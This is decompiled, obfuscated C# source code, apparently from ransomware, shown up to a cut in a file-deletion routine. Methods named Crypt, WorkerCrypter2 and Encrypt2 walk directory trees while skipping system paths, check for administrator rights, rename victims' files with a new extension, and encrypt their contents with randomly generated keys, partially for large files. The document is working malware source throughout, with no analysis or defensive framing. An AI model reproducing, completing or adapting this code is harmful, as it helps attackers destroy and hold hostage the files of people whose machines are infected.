using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using hooUcDpSACodnbPx;

namespace eMvPcEiNWKRwo;

internal sealed class NXVLxNyJvZLW
{
	public sealed class wqpvMNYfhziG
	{
		private static StringCollection FfyHMzkmSlPE;

		private static List<string> cjnTPAJkdfZBsHh;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107409211));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107409206)) && !text.ToLower().Contains(getString_0(107409217)) && !text.ToLower().Contains(getString_0(107394462)) && !text.ToLower().Contains(getString_0(107394449)) && !text.ToLower().Contains(getString_0(107409172)) && !text.ToLower().Contains(getString_0(107393789)) && !text.ToLower().Contains(getString_0(107393762)) && !text.ToLower().Contains(getString_0(107393713)) && !text.ToLower().Contains(getString_0(107393728)) && !text.ToLower().Contains(getString_0(107393711)) && !text.ToLower().Contains(getString_0(107393677)) && !text.ToLower().Contains(getString_0(107394140)) && !text.ToLower().Contains(getString_0(107394155)) && !text.ToLower().Contains(getString_0(107394110)) && !text.ToLower().Contains(getString_0(107394121)) && !text.ToLower().Contains(getString_0(107394076)) && !text.ToLower().Contains(getString_0(107394095)) && !text.ToLower().Contains(getString_0(107394046)) && !text.ToLower().Contains(getString_0(107394061)) && !text.Contains(tzJESwPzibp(getString_0(107394012))) && !text.Contains(getString_0(107394019)) && !text.Contains(getString_0(107393989)) && !text.EndsWith(getString_0(107395752)) && !text.EndsWith(getString_0(107393944)) && !text.EndsWith(getString_0(107393939)) && !text.EndsWith(getString_0(107393966)) && !text.EndsWith(getString_0(107393961)) && !text.ToLower().Contains(getString_0(107393956)) && !text.ToLower().Contains(czzhrocutRhNfDX))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(YJkGJJBIRovOj) * 1024.0 * 1024.0 && nMpuHIafUPAp == getString_0(107396890))
							{
								cjnTPAJkdfZBsHh.Add(text);
							}
							else if (File.Exists(text) && nMpuHIafUPAp == getString_0(107396807))
							{
								cjnTPAJkdfZBsHh.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return cjnTPAJkdfZBsHh;
		}

		static wqpvMNYfhziG()
		{
			Strings.CreateGetStringDelegate(typeof(wqpvMNYfhziG));
			FfyHMzkmSlPE = new StringCollection();
			cjnTPAJkdfZBsHh = new List<string>();
		}
	}

	private sealed class uvQwMOSVpyQBi
	{
		public string MLLKjXmHrbJXE;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == MLLKjXmHrbJXE;
		}
	}

	private sealed class WFPAUMVkIkkrPR
	{
		private sealed class vXLdsCAXPIQVMIX
		{
			public WFPAUMVkIkkrPR mYiSUZAlJgIJk;

			public string wMSTvTAsxoUjrC;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					ugkeHnHORzZvwy(WindowsIdentity.GetCurrent().Name, wMSTvTAsxoUjrC);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				aLWTrFQAtHVEaEy(wMSTvTAsxoUjrC, mYiSUZAlJgIJk.aitFwztVEekRG, mYiSUZAlJgIJk.fPtwXSqivhka, mYiSUZAlJgIJk.VNkqOLNhPr, mYiSUZAlJgIJk.CdXlDKnAWk);
			}
		}

		public string[] aitFwztVEekRG;

		public string[] VNkqOLNhPr;

		public string CdXlDKnAWk;

		public string fPtwXSqivhka;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1d(string string_0)
		{
			vXLdsCAXPIQVMIX CS_0024_003C_003E8__locals0 = new vXLdsCAXPIQVMIX();
			CS_0024_003C_003E8__locals0.mYiSUZAlJgIJk = this;
			CS_0024_003C_003E8__locals0.wMSTvTAsxoUjrC = string_0;
			if (PwyBWpPgqFzY && !pecXPOiThg().Contains(getString_0(107392470)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						ugkeHnHORzZvwy(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.wMSTvTAsxoUjrC);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (zZukKkiWQnr == getString_0(107396896))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					aLWTrFQAtHVEaEy(CS_0024_003C_003E8__locals0.wMSTvTAsxoUjrC, CS_0024_003C_003E8__locals0.mYiSUZAlJgIJk.aitFwztVEekRG, CS_0024_003C_003E8__locals0.mYiSUZAlJgIJk.fPtwXSqivhka, CS_0024_003C_003E8__locals0.mYiSUZAlJgIJk.VNkqOLNhPr, CS_0024_003C_003E8__locals0.mYiSUZAlJgIJk.CdXlDKnAWk);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				aLWTrFQAtHVEaEy(CS_0024_003C_003E8__locals0.wMSTvTAsxoUjrC, aitFwztVEekRG, fPtwXSqivhka, VNkqOLNhPr, CdXlDKnAWk);
			}
		}

		static WFPAUMVkIkkrPR()
		{
			Strings.CreateGetStringDelegate(typeof(WFPAUMVkIkkrPR));
		}
	}

	private sealed class nGvWoWrivTbPL
	{
		private sealed class zNemtfpNPipd
		{
			public nGvWoWrivTbPL pcNSSIayBgiA;

			public string JLKDNNMdoPJwan;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in vjYtJFEhxfpDHt)
				{
					if (JLKDNNMdoPJwan.ToLower().EndsWith(item + pcNSSIayBgiA.YizCOSyFjCE) && VPYFBwfqxXvG == getString_0(107396907))
					{
						if (Convert.ToInt32(NwFhVUnpoETLiI) * 1024 * 1024 > new FileInfo(JLKDNNMdoPJwan).Length)
						{
							try
							{
								HSDASSgFriA.qlPqGmOVoBTz(getString_0(107394371), getString_0(107394398), getString_0(107394385), JLKDNNMdoPJwan);
							}
							catch
							{
							}
						}
					}
					else if (JLKDNNMdoPJwan.ToLower().EndsWith(item) && VPYFBwfqxXvG == getString_0(107396824))
					{
						try
						{
							HSDASSgFriA.qlPqGmOVoBTz(getString_0(107394371), getString_0(107394398), getString_0(107394385), JLKDNNMdoPJwan);
						}
						catch
						{
						}
					}
				}
			}

			static zNemtfpNPipd()
			{
				Strings.CreateGetStringDelegate(typeof(zNemtfpNPipd));
			}
		}

		private sealed class jSEkHtEHBASKbIm
		{
			public nGvWoWrivTbPL pcNSSIayBgiA;

			public string KViFGgSYqc;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in vjYtJFEhxfpDHt)
				{
					if (KViFGgSYqc.ToLower().EndsWith(item + pcNSSIayBgiA.YizCOSyFjCE) && VPYFBwfqxXvG == getString_0(107396910))
					{
						if (Convert.ToInt32(NwFhVUnpoETLiI) * 1024 * 1024 > new FileInfo(KViFGgSYqc).Length)
						{
							try
							{
								HSDASSgFriA.qlPqGmOVoBTz(getString_0(107394374), getString_0(107394401), getString_0(107394388), KViFGgSYqc);
							}
							catch
							{
							}
						}
					}
					else if (KViFGgSYqc.ToLower().EndsWith(item) && VPYFBwfqxXvG == getString_0(107396827))
					{
						try
						{
							HSDASSgFriA.qlPqGmOVoBTz(getString_0(107394374), getString_0(107394401), getString_0(107394388), KViFGgSYqc);
						}
						catch
						{
						}
					}
				}
			}

			static jSEkHtEHBASKbIm()
			{
				Strings.CreateGetStringDelegate(typeof(jSEkHtEHBASKbIm));
			}
		}

		public List<string> oesEgXdCtutg;

		public List<string> BuhDElShFyYqgkBDZ;

		public string YizCOSyFjCE;

		public string[] abfWIafuyAZY;

		public string pxxUCyFtCioCIq;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2a(string string_0)
		{
			zNemtfpNPipd CS_0024_003C_003E8__locals0;
			foreach (string item in BuhDElShFyYqgkBDZ)
			{
				if (abfWIafuyAZY.Length != 0)
				{
					string[] array = abfWIafuyAZY;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_094b;
					}
				}
				try
				{
					if (item.EndsWith(YizCOSyFjCE))
					{
						goto IL_094b;
					}
				}
				catch (Exception)
				{
					goto IL_094b;
				}
				if (!item.EndsWith(string_0) || WEPWhUGwUtN.Contains(item))
				{
					continue;
				}
				if (MUSNUeGXusODlj == getString_0(107396904))
				{
					try
					{
						if (LbQngbCZSKbnPy.XqMViBLMqdwY(item))
						{
							LbQngbCZSKbnPy.NZTkqVcmhy(item);
						}
					}
					catch
					{
					}
				}
				WEPWhUGwUtN.Add(item);
				if (!UPKUrcjvrOIo.Contains(Path.GetDirectoryName(item)))
				{
					UPKUrcjvrOIo.Add(Path.GetDirectoryName(item));
				}
				GkFjkAyBjnbhm(item);
				try
				{
					new RoipdntborQL().jcavobxzlIUa(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (zcCjHpzjUtXX)
							{
								Console.WriteLine(getString_0(107409201) + item + getString_0(107409124) + new FileInfo(item).Length + getString_0(107409135));
								Console.WriteLine(getString_0(107409094));
							}
						}
						catch
						{
						}
						VhRTDkROaDJx(tzJESwPzibp(getString_0(107409533)), getString_0(107393342) + item + getString_0(107393342) + tzJESwPzibp(getString_0(107409476)) + getString_0(107393342) + Environment.UserName + getString_0(107393342) + tzJESwPzibp(getString_0(107409491)));
					}
				}
				catch (Exception ex2)
				{
					if (ZdcvQmUKIcPe)
					{
						try
						{
							File.AppendAllText(jYzmyFxkGGuJi, getString_0(107392612) + item + getString_0(107409466) + ex2.Message + getString_0(107397099));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (ZdcvQmUKIcPe)
						{
							try
							{
								File.AppendAllText(jYzmyFxkGGuJi, getString_0(107392612) + item + getString_0(107409353) + ex4.Message + getString_0(107397099));
							}
							catch (Exception)
							{
							}
						}
						FawBoUOtRlQs++;
						goto end_IL_02cd;
					}
					if (oFvDUXnLvZqk == getString_0(107396904) && new FileInfo(item).Length > Convert.ToInt32(bHpZgRTqvrgm) * 1024 * 1024 && !oesEgXdCtutg.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new zNemtfpNPipd();
						CS_0024_003C_003E8__locals0.pcNSSIayBgiA = this;
						try
						{
							if (YizCOSyFjCE != getString_0(107391848))
							{
								if (YIgbUMLXEZ)
								{
									YizCOSyFjCE = HkuaAWARBzGl + YizCOSyFjCE;
								}
								File.Move(item, item + YizCOSyFjCE);
							}
						}
						catch (Exception ex6)
						{
							if (ZdcvQmUKIcPe)
							{
								try
								{
									File.AppendAllText(jYzmyFxkGGuJi, getString_0(107392612) + item + getString_0(107409292) + ex6.Message + getString_0(107397099));
								}
								catch (Exception)
								{
								}
							}
							FawBoUOtRlQs++;
							goto end_IL_02cd;
						}
						CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan = getString_0(107394319);
						if (YizCOSyFjCE != getString_0(107391848))
						{
							CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan = item + YizCOSyFjCE;
						}
						else
						{
							CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan = item;
						}
						if (SBthqYiSUsxxBW == getString_0(107396904))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in vjYtJFEhxfpDHt)
								{
									if (CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.pcNSSIayBgiA.YizCOSyFjCE) && VPYFBwfqxXvG == zNemtfpNPipd.getString_0(107396907))
									{
										if (Convert.ToInt32(NwFhVUnpoETLiI) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan).Length)
										{
											try
											{
												HSDASSgFriA.qlPqGmOVoBTz(zNemtfpNPipd.getString_0(107394371), zNemtfpNPipd.getString_0(107394398), zNemtfpNPipd.getString_0(107394385), CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan.ToLower().EndsWith(item2) && VPYFBwfqxXvG == zNemtfpNPipd.getString_0(107396824))
									{
										try
										{
											HSDASSgFriA.qlPqGmOVoBTz(zNemtfpNPipd.getString_0(107394371), zNemtfpNPipd.getString_0(107394398), zNemtfpNPipd.getString_0(107394385), CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = sCnthEhwQbhLh.VOKyuCSpMLw(32);
						string s = BbfzHGzwtqigo.eTbdqfTZKGyJb(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = cLYeTxTBifMvTiA.SlfvoYGuggAUU(CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan, Convert.ToInt32(bHpZgRTqvrgm) * 1024 * 1024);
						if (!cLYeTxTBifMvTiA.DcIicDuahJozxMuyl(ESwOHaZtwoDL: (!cWvIRXFCjdwL) ? (sBOTyxVoVCQkJ ? cLYeTxTBifMvTiA.MBIBwyqqrY(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : cLYeTxTBifMvTiA.MBIBwyqqrY(byte_, Encoding.ASCII.GetBytes(pxxUCyFtCioCIq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (sBOTyxVoVCQkJ ? hwfWuUfzvIUG.iHBkWBbpwRJtWO(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : hwfWuUfzvIUG.iHBkWBbpwRJtWO(byte_, Encoding.ASCII.GetBytes(pxxUCyFtCioCIq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), KvQkETPykCnn: CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan, GvYIVDINSEjKoB: bytes))
						{
							try
							{
								File.Move(item + YizCOSyFjCE, item);
							}
							catch (Exception)
							{
							}
							continue;
						}
						goto IL_094b;
					}
					if (YIgbUMLXEZ)
					{
						YizCOSyFjCE = HkuaAWARBzGl + YizCOSyFjCE;
					}
					string text2 = sCnthEhwQbhLh.VOKyuCSpMLw(32);
					string s2 = BbfzHGzwtqigo.eTbdqfTZKGyJb(text2);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (YizCOSyFjCE != getString_0(107391848))
					{
						if (!GIsCSxnycEXIm)
						{
							if (!sBOTyxVoVCQkJ)
							{
								oYMtlOMiGDwjD(item, item + YizCOSyFjCE, LPxApPwqniHY);
							}
							else
							{
								oYMtlOMiGDwjD(item, item + YizCOSyFjCE, Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!sBOTyxVoVCQkJ)
								{
									MxFmhWgVdORlqd(item, item + YizCOSyFjCE, LPxApPwqniHY);
								}
								else
								{
									MxFmhWgVdORlqd(item, item + YizCOSyFjCE, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex9)
							{
								if (ZdcvQmUKIcPe)
								{
									try
									{
										File.AppendAllText(jYzmyFxkGGuJi, getString_0(107392612) + item + getString_0(107391866) + ex9.Message + getString_0(107397099));
									}
									catch (Exception)
									{
									}
								}
								FawBoUOtRlQs++;
								try
								{
									File.Move(item + YizCOSyFjCE, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_02cd;
							}
						}
					}
					else if (!GIsCSxnycEXIm)
					{
						if (!sBOTyxVoVCQkJ)
						{
							oYMtlOMiGDwjD(item, item + getString_0(107391843), LPxApPwqniHY);
						}
						else
						{
							oYMtlOMiGDwjD(item, item + getString_0(107391843), Encoding.ASCII.GetBytes(text2));
						}
					}
					else
					{
						try
						{
							if (!sBOTyxVoVCQkJ)
							{
								MxFmhWgVdORlqd(item, item, LPxApPwqniHY);
							}
							else
							{
								MxFmhWgVdORlqd(item, item, Encoding.ASCII.GetBytes(text2));
							}
						}
						catch (Exception ex12)
						{
							if (ZdcvQmUKIcPe)
							{
								try
								{
									File.AppendAllText(jYzmyFxkGGuJi, getString_0(107392612) + item + getString_0(107391866) + ex12.Message + getString_0(107397099));
								}
								catch (Exception)
								{
								}
							}
							FawBoUOtRlQs++;
							goto end_IL_02cd;
						}
					}
					if (sBOTyxVoVCQkJ)
					{
						if (YizCOSyFjCE != getString_0(107391848))
						{
							YlXQQyoEsG(item + YizCOSyFjCE, bytes2);
						}
						else
						{
							YlXQQyoEsG(item, bytes2);
						}
					}
					goto IL_094b;
					end_IL_02cd:;
				}
				catch (Exception)
				{
					goto IL_094b;
				}
				continue;
				IL_094b:
				BuhDElShFyYqgkBDZ.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string string_0)
		{
			jSEkHtEHBASKbIm CS_0024_003C_003E8__locals0 = new jSEkHtEHBASKbIm();
			CS_0024_003C_003E8__locals0.pcNSSIayBgiA = this;
			CS_0024_003C_003E8__locals0.KViFGgSYqc = string_0;
			if (abfWIafuyAZY.Length != 0)
			{
				string[] array = abfWIafuyAZY;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.KViFGgSYqc.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0a13;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.KViFGgSYqc.EndsWith(YizCOSyFjCE))
				{
					goto IL_0a13;
				}
			}
			catch (Exception)
			{
				goto IL_0a13;
			}
			if (!WEPWhUGwUtN.Contains(CS_0024_003C_003E8__locals0.KViFGgSYqc))
			{
				if (MUSNUeGXusODlj == getString_0(107396904))
				{
					try
					{
						if (LbQngbCZSKbnPy.XqMViBLMqdwY(CS_0024_003C_003E8__locals0.KViFGgSYqc))
						{
							LbQngbCZSKbnPy.NZTkqVcmhy(CS_0024_003C_003E8__locals0.KViFGgSYqc);
						}
					}
					catch
					{
					}
				}
				WEPWhUGwUtN.Add(CS_0024_003C_003E8__locals0.KViFGgSYqc);
				if (!UPKUrcjvrOIo.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.KViFGgSYqc)))
				{
					UPKUrcjvrOIo.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.KViFGgSYqc));
				}
				GkFjkAyBjnbhm(CS_0024_003C_003E8__locals0.KViFGgSYqc);
				try
				{
					new RoipdntborQL().jcavobxzlIUa(CS_0024_003C_003E8__locals0.KViFGgSYqc);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.KViFGgSYqc, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (zcCjHpzjUtXX)
							{
								Console.WriteLine(getString_0(107409201) + CS_0024_003C_003E8__locals0.KViFGgSYqc + getString_0(107409124) + new FileInfo(CS_0024_003C_003E8__locals0.KViFGgSYqc).Length + getString_0(107409135));
								Console.WriteLine(getString_0(107409094));
							}
						}
						catch
						{
						}
						VhRTDkROaDJx(tzJESwPzibp(getString_0(107409533)), getString_0(107393342) + CS_0024_003C_003E8__locals0.KViFGgSYqc + getString_0(107393342) + tzJESwPzibp(getString_0(107409476)) + getString_0(107393342) + Environment.UserName + getString_0(107393342) + tzJESwPzibp(getString_0(107409491)));
					}
				}
				catch (Exception ex2)
				{
					if (ZdcvQmUKIcPe)
					{
						try
						{
							File.AppendAllText(jYzmyFxkGGuJi, getString_0(107392612) + CS_0024_003C_003E8__locals0.KViFGgSYqc + getString_0(107409466) + ex2.Message + getString_0(107397099));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.KViFGgSYqc).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (ZdcvQmUKIcPe)
						{
							try
							{
								File.AppendAllText(jYzmyFxkGGuJi, getString_0(107392612) + CS_0024_003C_003E8__locals0.KViFGgSYqc + getString_0(107409353) + ex4.Message + getString_0(107397099));
							}
							catch (Exception)
							{
							}
						}
						FawBoUOtRlQs++;
						goto end_IL_031d_2;
					}
					if (oFvDUXnLvZqk == getString_0(107396904) && new FileInfo(CS_0024_003C_003E8__locals0.KViFGgSYqc).Length > Convert.ToInt32(bHpZgRTqvrgm) * 1024 * 1024)
					{
						try
						{
							if (YizCOSyFjCE != getString_0(107391848))
							{
								if (YIgbUMLXEZ)
								{
									YizCOSyFjCE = HkuaAWARBzGl + YizCOSyFjCE;
								}
								File.Move(CS_0024_003C_003E8__locals0.KViFGgSYqc, CS_0024_003C_003E8__locals0.KViFGgSYqc + YizCOSyFjCE);
							}
						}
						catch (Exception ex6)
						{
							if (ZdcvQmUKIcPe)
							{
								try
								{
									File.AppendAllText(jYzmyFxkGGuJi, getString_0(107392612) + CS_0024_003C_003E8__locals0.KViFGgSYqc + getString_0(107409292) + ex6.Message + getString_0(107397099));
								}
								catch (Exception)
								{
								}
							}
							FawBoUOtRlQs++;
							return;
						}
						if (YizCOSyFjCE != getString_0(107391848))
						{
							CS_0024_003C_003E8__locals0.KViFGgSYqc += YizCOSyFjCE;
						}
						if (SBthqYiSUsxxBW == getString_0(107396904))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in vjYtJFEhxfpDHt)
								{
									if (CS_0024_003C_003E8__locals0.KViFGgSYqc.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.pcNSSIayBgiA.YizCOSyFjCE) && VPYFBwfqxXvG == jSEkHtEHBASKbIm.getString_0(107396910))
									{
										if (Convert.ToInt32(NwFhVUnpoETLiI) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.KViFGgSYqc).Length)
										{
											try
											{
												HSDASSgFriA.qlPqGmOVoBTz(jSEkHtEHBASKbIm.getString_0(107394374), jSEkHtEHBASKbIm.getString_0(107394401), jSEkHtEHBASKbIm.getString_0(107394388), CS_0024_003C_003E8__locals0.KViFGgSYqc);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.KViFGgSYqc.ToLower().EndsWith(item) && VPYFBwfqxXvG == jSEkHtEHBASKbIm.getString_0(107396827))
									{
										try
										{
											HSDASSgFriA.qlPqGmOVoBTz(jSEkHtEHBASKbIm.getString_0(107394374), jSEkHtEHBASKbIm.getString_0(107394401), jSEkHtEHBASKbIm.getString_0(107394388), CS_0024_003C_003E8__locals0.KViFGgSYqc);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = sCnthEhwQbhLh.VOKyuCSpMLw(32);
						string s = BbfzHGzwtqigo.eTbdqfTZKGyJb(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = cLYeTxTBifMvTiA.SlfvoYGuggAUU(CS_0024_003C_003E8__locals0.KViFGgSYqc, Convert.ToInt32(bHpZgRTqvrgm) * 1024 * 1024);
						if (!cLYeTxTBifMvTiA.DcIicDuahJozxMuyl(ESwOHaZtwoDL: (!cWvIRXFCjdwL) ? (sBOTyxVoVCQkJ ? cLYeTxTBifMvTiA.MBIBwyqqrY(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : cLYeTxTBifMvTiA.MBIBwyqqrY(byte_, Encoding.ASCII.GetBytes(pxxUCyFtCioCIq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (sBOTyxVoVCQkJ ? hwfWuUfzvIUG.iHBkWBbpwRJtWO(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : hwfWuUfzvIUG.iHBkWBbpwRJtWO(byte_, Encoding.ASCII.GetBytes(pxxUCyFtCioCIq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), KvQkETPykCnn: CS_0024_003C_003E8__locals0.KViFGgSYqc, GvYIVDINSEjKoB: bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.KViFGgSYqc + YizCOSyFjCE, CS_0024_003C_003E8__locals0.KViFGgSYqc);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (YIgbUMLXEZ)
						{
							YizCOSyFjCE = HkuaAWARBzGl + YizCOSyFjCE;
						}
						string text2 = sCnthEhwQbhLh.VOKyuCSpMLw(32);
						string s2 = BbfzHGzwtqigo.eTbdqfTZKGyJb(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (YizCOSyFjCE != getString_0(107391848))
						{
							if (!GIsCSxnycEXIm)
							{
								if (!sBOTyxVoVCQkJ)
								{
									oYMtlOMiGDwjD(CS_0024_003C_003E8__locals0.KViFGgSYqc, CS_0024_003C_003E8__locals0.KViFGgSYqc + YizCOSyFjCE, LPxApPwqniHY);
								}
								else
								{
									oYMtlOMiGDwjD(CS_0024_003C_003E8__locals0.KViFGgSYqc, CS_0024_003C_003E8__locals0.KViFGgSYqc + YizCOSyFjCE, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!sBOTyxVoVCQkJ)
									{
										MxFmhWgVdORlqd(CS_0024_003C_003E8__locals0.KViFGgSYqc, CS_0024_003C_003E8__locals0.KViFGgSYqc + YizCOSyFjCE, LPxApPwqniHY);
									}
									else
									{
										MxFmhWgVdORlqd(CS_0024_003C_003E8__locals0.KViFGgSYqc, CS_0024_003C_003E8__locals0.KViFGgSYqc + YizCOSyFjCE, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex9)
								{
									if (ZdcvQmUKIcPe)
									{
										try
										{
											File.AppendAllText(jYzmyFxkGGuJi, getString_0(107392612) + CS_0024_003C_003E8__locals0.KViFGgSYqc + getString_0(107391866) + ex9.Message + getString_0(107397099));
										}
										catch (Exception)
										{
										}
									}
									FawBoUOtRlQs++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.KViFGgSYqc + YizCOSyFjCE, CS_0024_003C_003E8__locals0.KViFGgSYqc);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!GIsCSxnycEXIm)
						{
							if (!sBOTyxVoVCQkJ)
							{
								oYMtlOMiGDwjD(CS_0024_003C_003E8__locals0.KViFGgSYqc, CS_0024_003C_003E8__locals0.KViFGgSYqc + getString_0(107391843), LPxApPwqniHY);
							}
							else
							{
								oYMtlOMiGDwjD(CS_0024_003C_003E8__locals0.KViFGgSYqc, CS_0024_003C_003E8__locals0.KViFGgSYqc + getString_0(107391843), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!sBOTyxVoVCQkJ)
								{
									MxFmhWgVdORlqd(CS_0024_003C_003E8__locals0.KViFGgSYqc, CS_0024_003C_003E8__locals0.KViFGgSYqc, LPxApPwqniHY);
								}
								else
								{
									MxFmhWgVdORlqd(CS_0024_003C_003E8__locals0.KViFGgSYqc, CS_0024_003C_003E8__locals0.KViFGgSYqc, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex12)
							{
								if (ZdcvQmUKIcPe)
								{
									try
									{
										File.AppendAllText(jYzmyFxkGGuJi, getString_0(107392612) + CS_0024_003C_003E8__locals0.KViFGgSYqc + getString_0(107391866) + ex12.Message + getString_0(107397099));
									}
									catch (Exception)
									{
									}
								}
								FawBoUOtRlQs++;
								return;
							}
						}
						if (sBOTyxVoVCQkJ)
						{
							if (YizCOSyFjCE != getString_0(107391848))
							{
								YlXQQyoEsG(CS_0024_003C_003E8__locals0.KViFGgSYqc + YizCOSyFjCE, bytes2);
							}
							else
							{
								YlXQQyoEsG(CS_0024_003C_003E8__locals0.KViFGgSYqc, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0a13;
			IL_0a13:
			BuhDElShFyYqgkBDZ.Remove(CS_0024_003C_003E8__locals0.KViFGgSYqc);
		}

		static nGvWoWrivTbPL()
		{
			Strings.CreateGetStringDelegate(typeof(nGvWoWrivTbPL));
		}
	}

	private sealed class FerCFzqhQgGeXd
	{
		public string NwIrEpZzCQYOE;

		public string caeCAmsUBmyy;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(NwIrEpZzCQYOE);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
